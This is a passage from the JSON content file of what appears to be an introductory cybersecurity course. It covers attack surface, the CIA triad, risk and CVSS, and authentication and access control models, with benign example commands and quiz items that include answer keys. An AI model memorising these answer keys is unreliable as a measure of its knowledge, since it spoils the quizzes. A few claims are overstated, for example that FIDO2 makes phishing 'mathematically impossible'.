          "mainConcepts": "Asset valuation, threat vectors, attack surface calculation, and the Principle of Least Privilege.",
          "technicalTakeaways": "Minimizing open ports and removing excessive privileges drastically reduces the viable paths available to adversaries.",
          "commandsCovered": [
            "nmap -sn",
            "dig",
            "ss -tuln",
            "ps aux"
          ],
          "commonMistakes": "Confusing an asset with a vulnerability, or assuming security through obscurity is effective.",
          "learningOutcome": "You can calculate an organization's attack surface, evaluate threat vectors, and apply the Principle of Least Privilege."
        },
        "questions": [
          {
            "id": "q-11-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Security Fundamentals?",
            "options": [
              "Define cyber assets and asset valuation methodologies",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Define cyber assets and asset valuation methodologies is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-11-1",
        "type": "exact",
        "question": "What term describes the path or mechanism by which an attacker attacks or gains access to a target system?",
        "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _",
        "acceptedAnswers": [
          "threat vector",
          "threat-vector",
          "attack vector"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Two words describing the attack path.",
        "explanation": "A threat vector (or attack vector) is the specific path by which an adversary delivers an attack."
      },
      {
        "id": "q-11-2",
        "type": "multiple-choice",
        "question": "Which security principle dictates that users and services should only possess the minimum permissions required to perform their jobs?",
        "options": [
          "Principle of Infinite Trust",
          "Principle of Least Privilege",
          "Principle of Total Administrator Access",
          "Principle of Security through Obscurity"
        ],
        "correctIndex": 1,
        "hint": "Minimum privilege required for the task.",
        "explanation": "The Principle of Least Privilege ensures that compromised processes have minimal power to cause widespread damage."
      },
      {
        "id": "q-11-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Security Fundamentals?",
        "options": [
          "Define cyber assets and asset valuation methodologies",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Define cyber assets and asset valuation methodologies is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Asset Valuation & Threat Vectors",
        "instruction": "Identify public-facing assets of an organization using DNS queries.",
        "hints": [
          "Two words describing the attack path."
        ]
      },
      {
        "title": "Task 2: Attack Surface Analysis & Least Privilege",
        "instruction": "Audit listening ports on your machine to identify unnecessary exposed services.",
        "hints": [
          "Minimum privilege required for the task."
        ]
      },
      {
        "title": "Task 3: Foundations Review & Knowledge Synthesis",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-12"
  },
  {
    "id": "room-12",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 12,
    "title": "CIA Triad and Security Principles",
    "description": "Deep dive into the core guiding model of information security: Confidentiality, Integrity, and Availability.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-11",
    "whyAreYouHere": "Deep dive into the core guiding model of information security: Confidentiality, Integrity, and Availability.",
    "objectives": [
      "Deconstruct the CIA Triad: Confidentiality, Integrity, and Availability",
      "Implement non-repudiation and accountability controls",
      "Map real-world attacks to CIA Triad violations",
      "Design balanced security controls without destroying usability"
    ],
    "skillsGained": [
      "CIA Triad",
      "Non-Repudiation",
      "Security Control Mapping",
      "Balanced Protection"
    ],
    "toolsAndCommands": [
      "sha256sum",
      "gpg --verify",
      "openssl dgst",
      "uptime"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Confidentiality, Integrity, Availability (CIA)",
        "concept": "The **CIA Triad** is the foundational benchmark for all cybersecurity policies:\n- **Confidentiality:** Ensuring information is accessible only to authorized entities. Preserved through encryption (AES-256), access control lists (ACLs), and multi-factor authentication (MFA). Violations include data breaches and credential leaks.\n- **Integrity:** Maintaining the absolute accuracy, completeness, and tamper-resistance of data. Preserved through cryptographic hashes (SHA-256) and digital signatures. Violations include unauthorized database modification and man-in-the-middle packet alterations.\n- **Availability:** Ensuring authorized users have reliable, timely access to data and systems when needed. Preserved through redundancy, high-availability clustering, backups, and DDoS mitigation. Violations include ransomware encryption and network floods.",
        "whyItMatters": "Every security control and incident report directly addresses one or more legs of the CIA Triad.",
        "examples": [
          "Confidentiality Attack: Adversary dumps SQL database containing hashed passwords and credit cards",
          "Integrity Attack: Adversary alters bank account balance records directly in storage",
          "Availability Attack: Adversary launches 100 Gbps SYN flood against an e-commerce checkout server"
        ],
        "commands": [
          {
            "cmd": "echo 'CALION' | sha256sum",
            "desc": "Generate SHA-256 hash to demonstrate cryptographic integrity verification"
          }
        ],
        "guidedExercise": "Generate a cryptographic hash of a sample string to observe tamper-evidence.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-12-1",
            "type": "multiple-choice",
            "question": "A ransomware attack that encrypts all hospital database files and demands payment to restore access primarily violates which component of the CIA Triad?",
            "options": [
              "Confidentiality",
              "Availability",
              "Non-repudiation",
              "Authorization"
            ],
            "correctIndex": 1,
            "hint": "The hospital staff can no longer access the systems to treat patients.",
            "explanation": "Ransomware primarily destroys Availability by preventing authorized users from accessing their critical systems and data."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Non-Repudiation & Cryptographic Hash Verification",
        "concept": "Beyond the CIA Triad, modern security requires **Non-Repudiation**\u2014the inability of a party to dispute the validity of a contract, statement, or transaction they authorized. Non-repudiation is achieved using asymmetric digital signatures (RSA/ECDSA), where only the sender's private key could have produced the signature, verifiable by anyone with the sender's public key.",
        "whyItMatters": "Non-repudiation prevents malicious actors or dishonest insiders from claiming 'it was not me'.",
        "examples": [
          "Code Signing: Ensuring software updates originated from Microsoft, not a trojan creator",
          "Git Commit Signing: GPG keys guaranteeing commit authorship"
        ],
        "commands": [
          {
            "cmd": "sha256sum /etc/passwd",
            "desc": "Calculate integrity hash of local accounts file"
          },
          {
            "cmd": "openssl dgst -sha256 /etc/passwd",
            "desc": "Alternative OpenSSL digest calculation"
          }
        ],
        "guidedExercise": "Compute the hash of /etc/passwd and observe how changing a single byte alters the output entirely (avalanche effect).",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-12-2",
            "type": "exact",
            "question": "What mathematical security property ensures that a sender cannot deny having sent a message or initiated a transaction?",
            "visualSlots": "_ _ _ - _ _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "non-repudiation",
              "non repudiation"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Non- followed by repudiation.",
            "explanation": "Non-repudiation provides undeniable cryptographic proof of the origin and integrity of data."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: CIA Triad Synthesis & Final Review",
        "concept": "Balance is essential: an overly restrictive system with 100% confidentiality may become unusable, destroying availability. Security architects evaluate trade-offs based on organizational risk tolerance.",
        "whyItMatters": "Security controls must enable the business safely, not halt operations.",
        "examples": [
          "Medical systems: Integrity and Availability often outweigh absolute Confidentiality in emergency care",
          "Defense/Intelligence: Confidentiality is paramount"
        ],
        "commands": [
          {
            "cmd": "echo 'test' | sha256sum",
            "desc": "Verify hash output"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "The CIA Triad (Confidentiality, Integrity, Availability), non-repudiation, and cryptographic hashing verification.",
          "technicalTakeaways": "Confidentiality uses encryption; Integrity uses hashes and digital signatures; Availability uses redundancy and DDoS mitigation.",
          "commandsCovered": [
            "sha256sum",
            "openssl dgst"
          ],
          "commonMistakes": "Thinking encryption provides integrity (an encrypted message can still be tampered with unless authenticated).",
          "learningOutcome": "You can classify security events according to the CIA Triad and verify data integrity using cryptographic hashes."
        },
        "questions": [
          {
            "id": "q-12-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in CIA Triad and Security Principles?",
            "options": [
              "Deconstruct the CIA Triad: Confidentiality, Integrity, and Availability",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Deconstruct the CIA Triad: Confidentiality, Integrity, and Availability is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-12-1",
        "type": "multiple-choice",
        "question": "A ransomware attack that encrypts all hospital database files and demands payment to restore access primarily violates which component of the CIA Triad?",
        "options": [
          "Confidentiality",
          "Availability",
          "Non-repudiation",
          "Authorization"
        ],
        "correctIndex": 1,
        "hint": "The hospital staff can no longer access the systems to treat patients.",
        "explanation": "Ransomware primarily destroys Availability by preventing authorized users from accessing their critical systems and data."
      },
      {
        "id": "q-12-2",
        "type": "exact",
        "question": "What mathematical security property ensures that a sender cannot deny having sent a message or initiated a transaction?",
        "visualSlots": "_ _ _ - _ _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "non-repudiation",
          "non repudiation"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Non- followed by repudiation.",
        "explanation": "Non-repudiation provides undeniable cryptographic proof of the origin and integrity of data."
      },
      {
        "id": "q-12-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in CIA Triad and Security Principles?",
        "options": [
          "Deconstruct the CIA Triad: Confidentiality, Integrity, and Availability",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Deconstruct the CIA Triad: Confidentiality, Integrity, and Availability is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Confidentiality, Integrity, Availability (CIA)",
        "instruction": "Generate a cryptographic hash of a sample string to observe tamper-evidence.",
        "hints": [
          "The hospital staff can no longer access the systems to treat patients."
        ]
      },
      {
        "title": "Task 2: Non-Repudiation & Cryptographic Hash Verification",
        "instruction": "Compute the hash of /etc/passwd and observe how changing a single byte alters the output entirely (avalanche effect).",
        "hints": [
          "Non- followed by repudiation."
        ]
      },
      {
        "title": "Task 3: CIA Triad Synthesis & Final Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-13"
  },
  {
    "id": "room-13",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 13,
    "title": "Threats, Vulnerabilities and Risks",
    "description": "Deconstruct the fundamental equation of cybersecurity: Risk = Threat \u00d7 Vulnerability \u00d7 Impact.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-12",
    "whyAreYouHere": "Deconstruct the fundamental equation of cybersecurity: Risk = Threat \u00d7 Vulnerability \u00d7 Impact.",
    "objectives": [
      "Differentiate between a Threat, a Vulnerability, and a Risk",
      "Calculate quantitative and qualitative risk matrices",
      "Understand the Common Vulnerability Scoring System (CVSS v3.1)",
      "Evaluate risk treatment options: Mitigate, Transfer, Accept, Avoid"
    ],
    "skillsGained": [
      "Risk Equation",
      "CVSS Metrics",
      "Vulnerability Assessment",
      "Risk Treatment"
    ],
    "toolsAndCommands": [
      "searchsploit",
      "cve-lookup",
      "nmap --script vuln"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Threat vs Vulnerability vs Risk",
        "concept": "These three terms are frequently confused but represent distinct concepts:\n- **Threat:** Any circumstance or event with the potential to adversely impact an asset (e.g. a ransomware gang, an earthquake, or an insider with malicious intent). Threats exist independently outside your control.\n- **Vulnerability:** A flaw, weakness, or bug in system design, implementation, or configuration that can be exploited by a threat (e.g. an unpatched buffer overflow in OpenSSL, or an unquoted service path).\n- **Risk:** The probability and impact that a specific threat will successfully exploit a vulnerability to cause harm.\n$$\\text{Risk} = \\text{Threat} \\times \\text{Vulnerability} \\times \\text{Impact}$$\nIf there is a severe vulnerability but no threat capable of reaching it, the risk is negligible.",
        "whyItMatters": "Understanding this distinction prevents wasteful security spending on non-viable threats.",
        "examples": [
          "Threat: APT29 targeting defense contractors",
          "Vulnerability: CVE-2021-44228 (Log4Shell) in an internal logging library",
          "Risk: High probability of complete remote code execution and intellectual property theft"
        ],
        "commands": [
          {
            "cmd": "uname -r",
            "desc": "Check host kernel release to research known associated CVE vulnerabilities"
          }
        ],
        "guidedExercise": "Observe how vulnerabilities are identified and tracked across the global security community.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-13-1",
            "type": "exact",
            "question": "What term specifically describes a bug, flaw, or weakness in software or hardware that can be exploited?",
            "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "vulnerability",
              "vulnerabilities"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "A weakness in the system.",
            "explanation": "A vulnerability is a weakness in software, hardware, or configuration that can be exploited."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: CVSS Scoring & Risk Treatment",
        "concept": "Vulnerabilities are cataloged as **Common Vulnerabilities and Exposures (CVE)** and scored using the **Common Vulnerability Scoring System (CVSS)** on a 0.0 to 10.0 scale:\n- **Low (0.1 - 3.9)**\n- **Medium (4.0 - 6.9)**\n- **High (7.0 - 8.9)**\n- **Critical (9.0 - 10.0)** (e.g. unauthenticated remote code execution with network access).\nOrganizations respond to risk using four **Risk Treatment Strategies**:\n1. **Mitigate:** Apply security controls or patches to reduce likelihood or impact (e.g. installing a software update)\n2. **Transfer:** Shift financial risk to a third party (e.g. purchasing cyber insurance or outsourcing hosting)\n3. **Avoid:** Eliminate the risky activity entirely (e.g. shutting down an unmaintainable legacy server)\n4. **Accept:** Acknowledge the risk when the cost of mitigation exceeds potential loss.",
        "whyItMatters": "Patch prioritization depends on CVSS metrics and active in-the-wild exploitation (CISA KEV catalog).",
        "examples": [
          "Mitigate: Patch CVE-2023-34362 in MOVEit Transfer",
          "Transfer: Cyber insurance policy covering $5M in breach liability",
          "Accept: Low-risk informational banner leak"
        ],
        "commands": [
          {
            "cmd": "curl -s https://cve.mitre.org",
            "desc": "Query public vulnerability database"
          }
        ],
        "guidedExercise": "Evaluate how CVSS Base Metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction) produce an objective severity score.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-13-2",
            "type": "multiple-choice",
            "question": "Which risk treatment strategy is being applied when an organization purchases a comprehensive cyber insurance policy?",
            "options": [
              "Risk Mitigation",
              "Risk Transfer",
              "Risk Avoidance",
              "Risk Acceptance"
            ],
            "correctIndex": 1,
            "hint": "Shifting financial liability to an insurance company.",
            "explanation": "Risk Transfer shifts the financial burden of an incident to a third party, such as an insurance underwriter."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Risk Assessment Synthesis & Final Review",
        "concept": "Risk management is continuous. Threat intelligence feeds, automated vulnerability scanners, and executive impact analyses keep risk registers up-to-date.",
        "whyItMatters": "Security teams prioritize vulnerabilities based on realistic adversary exploitability, not just theoretical severity.",
        "examples": [
          "CISA Known Exploited Vulnerabilities (KEV): Catalog of vulnerabilities actively used in ransomware"
        ],
        "commands": [
          {
            "cmd": "echo 'Risk = Threat x Vulnerability x Impact'",
            "desc": "Review core equation"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Threats vs vulnerabilities vs risks, CVSS v3.1 scoring, and the four risk treatment strategies (mitigate, transfer, accept, avoid).",
          "technicalTakeaways": "A vulnerability without a threat carries low risk. CVSS scores evaluate severity objectively based on attack vector and complexity.",
          "commandsCovered": [
            "uname -r"
          ],
          "commonMistakes": "Using 'threat' and 'vulnerability' interchangeably, or assuming all CVEs carry equal real-world risk.",
          "learningOutcome": "You can calculate risk, interpret CVSS severity scores, and select appropriate risk treatment strategies."
        },
        "questions": [
          {
            "id": "q-13-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Threats, Vulnerabilities and Risks?",
            "options": [
              "Differentiate between a Threat, a Vulnerability, and a Risk",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate between a Threat, a Vulnerability, and a Risk is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-13-1",
        "type": "exact",
        "question": "What term specifically describes a bug, flaw, or weakness in software or hardware that can be exploited?",
        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "vulnerability",
          "vulnerabilities"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "A weakness in the system.",
        "explanation": "A vulnerability is a weakness in software, hardware, or configuration that can be exploited."
      },
      {
        "id": "q-13-2",
        "type": "multiple-choice",
        "question": "Which risk treatment strategy is being applied when an organization purchases a comprehensive cyber insurance policy?",
        "options": [
          "Risk Mitigation",
          "Risk Transfer",
          "Risk Avoidance",
          "Risk Acceptance"
        ],
        "correctIndex": 1,
        "hint": "Shifting financial liability to an insurance company.",
        "explanation": "Risk Transfer shifts the financial burden of an incident to a third party, such as an insurance underwriter."
      },
      {
        "id": "q-13-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Threats, Vulnerabilities and Risks?",
        "options": [
          "Differentiate between a Threat, a Vulnerability, and a Risk",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate between a Threat, a Vulnerability, and a Risk is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Threat vs Vulnerability vs Risk",
        "instruction": "Observe how vulnerabilities are identified and tracked across the global security community.",
        "hints": [
          "A weakness in the system."
        ]
      },
      {
        "title": "Task 2: CVSS Scoring & Risk Treatment",
        "instruction": "Evaluate how CVSS Base Metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction) produce an objective severity score.",
        "hints": [
          "Shifting financial liability to an insurance company."
        ]
      },
      {
        "title": "Task 3: Risk Assessment Synthesis & Final Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-14"
  },
  {
    "id": "room-14",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 14,
    "title": "Authentication and Access Control",
    "description": "Master identity security: password hygiene, Multi-Factor Authentication (MFA), and Access Control models (DAC, MAC, RBAC, ABAC).",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-13",
    "whyAreYouHere": "Master identity security: password hygiene, Multi-Factor Authentication (MFA), and Access Control models (DAC, MAC, RBAC, ABAC).",
    "objectives": [
      "Differentiate Authentication (AuthN) from Authorization (AuthZ)",
      "Analyze the three fundamental authentication factors",
      "Understand Multi-Factor Authentication (MFA) and FIDO2/WebAuthn",
      "Compare access control architectures: DAC, MAC, RBAC, and ABAC"
    ],
    "skillsGained": [
      "AuthN vs AuthZ",
      "MFA Implementation",
      "FIDO2 / WebAuthn",
      "RBAC vs ABAC"
    ],
    "toolsAndCommands": [
      "passwd",
      "sudo -l",
      "id",
      "getent group"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Authentication vs Authorization & The Three Factors",
        "concept": "Identity security relies on two distinct processes:\n- **Authentication (AuthN):** Verifying *who you are* (verifying identity claims)\n- **Authorization (AuthZ):** Determining *what you are permitted to do* (enforcing permissions after authentication).\nAuthentication factors fall into three classic categories:\n1. **Something you KNOW:** Passwords, PINs, security questions (vulnerable to phishing, brute-forcing, credential stuffing)\n2. **Something you HAVE:** Hardware security keys (YubiKey), smartphone authenticator apps (TOTP), smart cards (resilient against remote credential reuse)\n3. **Something you ARE:** Biometrics like fingerprints, facial recognition, iris scans (cannot be changed if compromised).\n**Multi-Factor Authentication (MFA)** requires at least two *different* factors (e.g. password + hardware token). Using two passwords is NOT multi-factor.",
        "whyItMatters": "Over 80% of corporate data breaches involve compromised or stolen credentials. MFA halts automated credential stuffing.",
        "examples": [
          "AuthN: Logging in with username and password + TOTP token",
          "AuthZ: Checking if the authenticated user has role 'admin' before displaying delete button"
        ],
        "commands": [
          {
            "cmd": "sudo -l",
            "desc": "Check user-specific authorization permissions under sudoers policy"
          },
          {
            "cmd": "id",
            "desc": "Display user identity (AuthN) and security groups (AuthZ)"
          }
        ],
        "guidedExercise": "Execute sudo -l to view what administrative commands your user is authorized to run.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-14-1",
            "type": "multiple-choice",
            "question": "Which of the following constitutes genuine Multi-Factor Authentication (MFA)?",
            "options": [
              "Entering a password and then entering your mother's maiden name",
              "Entering a password (Something you KNOW) and providing a YubiKey hardware touch token (Something you HAVE)",
              "Entering two different passwords sent to the same email address",
              "Entering your username and repeating it in lowercase"
            ],
            "correctIndex": 1,
            "hint": "Must combine two different factor categories.",
            "explanation": "True MFA requires combining distinct factor categories (Knowledge + Possession or Biometrics)."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Access Control Models: DAC, MAC, RBAC & ABAC",
        "concept": "Once authenticated, access control models determine permissions:\n- **Discretionary Access Control (DAC):** The resource owner sets permissions (e.g. standard Linux `chmod/chown`; users can grant anyone access to their own files)\n- **Mandatory Access Control (MAC):** Centralized security policy enforced by the OS based on security labels and clearance levels (e.g. SELinux, military Top Secret/Secret; users cannot override policies)\n- **Role-Based Access Control (RBAC):** Permissions are assigned to roles (e.g. 'Security Analyst', 'Billing Admin'), and users are assigned to roles. Greatly simplifies enterprise identity governance\n- **Attribute-Based Access Control (ABAC):** Fine-grained policy evaluation based on dynamic attributes: User role, Resource sensitivity, Action requested, and Environmental context (e.g. time of day, location, device health).",
        "whyItMatters": "Modern Zero Trust architectures rely heavily on ABAC to verify context (e.g. blocking logins from unexpected countries even if passwords match).",
        "examples": [
          "DAC: A user runs chmod 777 report.pdf",
          "MAC: SELinux blocks web server from reading user home directories regardless of file permissions",
          "RBAC: Adding new hire to 'Developers' active directory group grants GitHub access"
        ],
        "commands": [
          {
            "cmd": "ls -Z /var/www",
            "desc": "Display SELinux security context labels (Mandatory Access Control)"
          },
          {
            "cmd": "groups",
            "desc": "List group memberships associated with active user (Role-Based Access Control)"
          }
        ],
        "guidedExercise": "Inspect your group memberships to see what administrative roles you inherit.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-14-2",
            "type": "exact",
            "question": "Which enterprise access control model assigns permissions to job roles rather than directly to individual users?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "RBAC",
              "Role-Based Access Control"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym for Role-Based Access Control.",
            "explanation": "RBAC assigns permissions to functional roles, simplifying user permission management."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Modern Identity (FIDO2) & Final Knowledge Review",
        "concept": "Legacy SMS and push notification MFA are vulnerable to SIM swapping and adversary-in-the-middle (AiTM) phishing proxies (like Evilginx). The gold standard today is **FIDO2 / WebAuthn**, which cryptographically binds authentication credentials to the specific browser domain origin using public-key cryptography, making phishing mathematically impossible.",
        "whyItMatters": "FIDO2 hardware security keys completely defeat phishing proxies.",
        "examples": [
          "WebAuthn: Browser generates keypair unique to target domain; private key never leaves physical hardware chip"
        ],
        "commands": [
          {
            "cmd": "getent group sudo",
            "desc": "Verify which user accounts hold administrative sudo authorization"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Authentication vs authorization, three authentication factors, Multi-Factor Authentication (MFA), FIDO2/WebAuthn, and access control models (DAC, MAC, RBAC, ABAC).",
          "technicalTakeaways": "MFA requires two different factor categories. RBAC assigns permissions to job roles; ABAC evaluates dynamic contextual attributes.",
          "commandsCovered": [
            "sudo -l",
            "id",
            "groups",
            "ls -Z"
          ],
          "commonMistakes": "Confusing AuthN (who you are) with AuthZ (what you can do), or assuming two passwords equal MFA.",
          "learningOutcome": "You can design secure authentication workflows, enforce Least Privilege using RBAC, and distinguish DAC from MAC."
        },
        "questions": [
          {
            "id": "q-14-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Authentication and Access Control?",
            "options": [
              "Differentiate Authentication (AuthN) from Authorization (AuthZ)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate Authentication (AuthN) from Authorization (AuthZ) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-14-1",
        "type": "multiple-choice",
        "question": "Which of the following constitutes genuine Multi-Factor Authentication (MFA)?",
        "options": [
          "Entering a password and then entering your mother's maiden name",
          "Entering a password (Something you KNOW) and providing a YubiKey hardware touch token (Something you HAVE)",
          "Entering two different passwords sent to the same email address",
          "Entering your username and repeating it in lowercase"
        ],
        "correctIndex": 1,
        "hint": "Must combine two different factor categories.",
        "explanation": "True MFA requires combining distinct factor categories (Knowledge + Possession or Biometrics)."
      },
      {
        "id": "q-14-2",
        "type": "exact",
        "question": "Which enterprise access control model assigns permissions to job roles rather than directly to individual users?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "RBAC",
          "Role-Based Access Control"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym for Role-Based Access Control.",
        "explanation": "RBAC assigns permissions to functional roles, simplifying user permission management."
      },
      {
        "id": "q-14-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Authentication and Access Control?",
        "options": [
          "Differentiate Authentication (AuthN) from Authorization (AuthZ)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate Authentication (AuthN) from Authorization (AuthZ) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Authentication vs Authorization & The Three Factors",
        "instruction": "Execute sudo -l to view what administrative commands your user is authorized to run.",
        "hints": [
          "Must combine two different factor categories."
        ]
      },
      {
        "title": "Task 2: Access Control Models: DAC, MAC, RBAC & ABAC",
        "instruction": "Inspect your group memberships to see what administrative roles you inherit.",
        "hints": [
          "Four-letter acronym for Role-Based Access Control."
        ]
      },
      {
        "title": "Task 3: Modern Identity (FIDO2) & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-15"
  },
  {
    "id": "room-15",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 15,
    "title": "Cryptography Fundamentals",
    "description": "Master practical cryptography: symmetric ciphers (AES), asymmetric key pairs (RSA/ECC), cryptographic hashing, and digital certificates.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-14",
    "whyAreYouHere": "Master practical cryptography: symmetric ciphers (AES), asymmetric key pairs (RSA/ECC), cryptographic hashing, and digital certificates.",
    "objectives": [
      "Differentiate Symmetric encryption (AES) from Asymmetric encryption (RSA/ECC)",
      "Understand cryptographic hash functions and collision resistance",
      "Explain Digital Signatures and Public Key Infrastructure (PKI)",
      "Analyze TLS 1.3 handshake mechanics and forward secrecy"
    ],
    "skillsGained": [
      "Symmetric vs Asymmetric",
      "AES & RSA",
      "Hash Collisions",
      "PKI & Digital Signatures"
    ],
    "toolsAndCommands": [
      "openssl enc",
      "openssl dgst",
      "openssl s_client",
      "gpg"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Symmetric vs Asymmetric Encryption",
